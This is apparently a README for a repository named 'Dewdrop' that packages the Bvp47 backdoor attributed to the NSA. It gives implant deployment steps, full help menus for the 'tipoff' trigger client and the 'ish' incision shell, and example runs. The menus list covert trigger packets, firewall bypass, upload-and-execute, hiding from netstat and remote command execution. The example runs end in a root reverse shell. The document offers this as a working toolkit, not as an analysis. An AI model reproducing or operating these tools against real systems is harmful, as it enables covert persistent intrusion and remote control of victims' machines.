## Dewdrop

Bvp47. NSA it up yo

#### Usage
```
# keying instructions
Implants and client are pinned with RSA pub/private keys

# On target
./dewdrop

# v3 Tipoff/client help menu
./dewdrop_tipoff__v__3.3.2.2_x86_64-darwin -h
usage: ./dewdrop_tipoff__v__3.3.2.2_x86_64-darwin [options]

* -t, --destination-address address[:port]  - The address to send the trigger packet to
+ -p, --destination-port port               - Port to use for sending trigger
  -R, --trigger-address address             - The target address to use in the trigger
                                              command data, required when using nat with
                                              a trigger packet.  The target address is used
                                              by default.
* -a, --callback-address address[:port]     - The trigger callback address
* -c, --callback-port port                  - The trigger callback port
  -s, --source-address address[:port]       - Use this source address for the trigger
  -u, --source-port port                    - Use this port when sending tcp/udp
* -r, --protocol, --transport protocol      - Transport layer protocol used to send trigger (tcp/udp/icmp)
  -A, --application protocol                - Application layer protocol used to send trigger (dns/smtp/sip)
  -C, --command command                     - The command protocol identification value.
  -E, --time time                           - The time to use, in seconds since the epoch
  -K, --time-skew skew                      - The time skew to use, in seconds

  -M, --list-icmp-options                   - List typical icmp options
  -I, --icmp-options type,code              - icmp type and code fields

  -n, --raw-send [<address>:]port           - Send raw trigger packet data to this address,
                                              port.  The default address is localhost.
  -o, --tcp-connect                         - Establish tcp connection for trigger
  -f, --tcp-flags flag[,flag]               - tcp flags (syn, fin, rst, push, ack, urg)

  -L, --list-firewall-types                 - Print supported firewall types to stdout
  -F, --bypass-firewall type                - Bypass firewall (types: pix)

  -m, --mail-from address                   - Use this as `from` address for SMTP/SIP application protocol data
  -l, --rcpt-to address                     - Use this as `to` address for SMTP/SIP application protocol data
  -d, --dns-flags bytes                     - The 16-bit dns flags value

  -U, --forward-offset                      - Use a forward offset trigger packet
  -T, --start                               - The 16-bit start of trigger data value

  -i, --start-ish                           - Start an incision callback listener
  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file

  -q, --quiet                               - Do not print informational messages
  -h, --help                                - This help message

## V4 help
usage: ./tipoff-4.X [options]

* -t, --destination-address address[:port]  - The address to send the trigger packet to
+ -p, --destination-port port               - Port to use for sending trigger
  -R, --trigger-address address             - The target address to use in the trigger
                                              command data, required when using nat with
                                              a trigger packet.  The target address is used
                                              by default.
* -a, --callback-address address[:port]     - The trigger callback address
* -c, --callback-port port                  - The trigger callback port
  -s, --source-address address[:port]       - Use this source address for the trigger
  -u, --source-port port                    - Use this port when sending tcp/udp
* -r, --protocol, --transport protocol      - Transport layer protocol used to send trigger (tcp/udp/icmp)
  -A, --application protocol                - Application layer protocol used to send trigger (dns/smtp/sip)
  -C, --command command                     - The command protocol identification value.
  -E, --time time                           - The time to use, in seconds since the epoch
  -K, --time-skew skew                      - The time skew to use, in seconds

  -M, --list-icmp-options                   - List typical icmp options
  -I, --icmp-options type,code              - icmp type and code fields

  -n, --raw-send [<address>:]port           - Send raw trigger packet data to this address,
                                              port.  The default address is localhost.
  -o, --tcp-connect                         - Establish tcp connection for trigger
  -f, --tcp-flags flag[,flag]               - tcp flags (syn, fin, rst, push, ack, urg)

  -L, --list-firewall-types                 - Print supported firewall types to stdout
  -F, --bypass-firewall type                - Bypass firewall (types: pix)

  -m, --mail-from address                   - Use this as `from` address for SMTP/SIP application protocol data
  -l, --rcpt-to address                     - Use this as `to` address for SMTP/SIP application protocol data
  -d, --dns-flags bytes                     - The 16-bit dns flags value

  -T, --start                               - The 16-bit start of trigger data value

  -i, --start-ish                           - Start an incision callback listener
  -x, --upload-execute file                 - Use command 0x04 to upload and execute contents of given file
      --execute        file (deprecated)
  -X, --no-upload-execute cmd               - Use command 0x07 and to execute the given command on target


  -q, --quiet                               - Do not print informational messages
  -h, --help                                - This help message

# Run arbitrary Command
./tipoff-4.X --trigger-address 10.0.2.5 --target-address 10.0.2.5 --target-protocol tcp --target-port 10 --callback-address 10.0.2.15 --callback-port 99 -X ifconfig 
TRIGGER DATA
  COMMAND                  = 0x07
  DESTINATION ADDRESS      = 10.0.2.5:10
  TRANSPORT PROTOCOL       = tcp (6)
  TIME STAMP               = Mon Aug  7 19:30:00 2023 (1691451000)
  TIME SKEW                = 43200
  CALLBACK ADDRESS         = 10.0.2.15:99
  SOURCE PORT              = 63232
  TCP FLAGS                = ACK (0x10)
  START OF TRIGGER         = 0x355a

# Start ish (incision reverse mode)
# on client
./tipoff-3.X --trigger-address 10.0.2.5 --target-address 10.0.2.5 --target-protocol tcp --target-port 10 --callback-address 10.0.2.15 --callback-port 99 --start-ish
TRIGGER DATA
  COMMAND                  = 0x01
  DESTINATION ADDRESS      = 10.0.2.5:10
  TRANSPORT PROTOCOL       = tcp (6)
  TIME STAMP               = Mon Aug  7 17:51:30 2023 (1691445090)
  TIME SKEW                = 43200
  CALLBACK ADDRESS         = 10.0.2.15:99
  SOURCE PORT              = 60429
  TCP FLAGS                = ACK (0x10)
  START OF TRIGGER         = 0xe13f

Invoking ISH on port 99...
Trying 127.0.0.1...
Connected to 127.0.0.1.
Skipping environment dump...
bash-5.2# 
```

```
# Incision help
Usage: ish  [-8] [-E] [-K] [-L] [-X atype] [-a] [-d] [-e char] [-k realm]
	[-l user] [-n tracefile] [-r] [host-name [port]]


Extended Usage:
ish [-g ip:port] [-t ip:port] [-[i|c] ip[:port]] [-m <xterm|lost>] [-n]
  [-o <offset time>] [-p <port>] [-s <port>] [-v] <host-name>

  -g ip:port       gateway IP/port address to the tunnel
  -i ip[:port]     IP address target should connect to
  -c ip:port       IP/port of tunnel that target is connect to
  -W ip:port       IP/port of computer that will forward the raw packet
  -m xterm         run xterm on target
  -m lost          run our daemon in /lost+found
  -n               disable hiding from netstat
  -o offset time   [+/-] minutes of target clock
  -p port          use port <port> instead of ephemeral port
  -s port          to send TCP SYN packet trigger to <port> vice UDP
  -J		    use ICMP destination/port unreachable packet
  -y		    use ICMP echo request packet with DNS payload
  -Y 		    use ICMP echo request packet with ICMP payload
  -t ip:port       Start a tunneller process listening on IP/port
  -v               Verbose output

```


References:
```
https://www.pangulab.cn/files/The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group.en.pdf
https://www.pangulab.cn/files/The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group_ii.en.pdf
```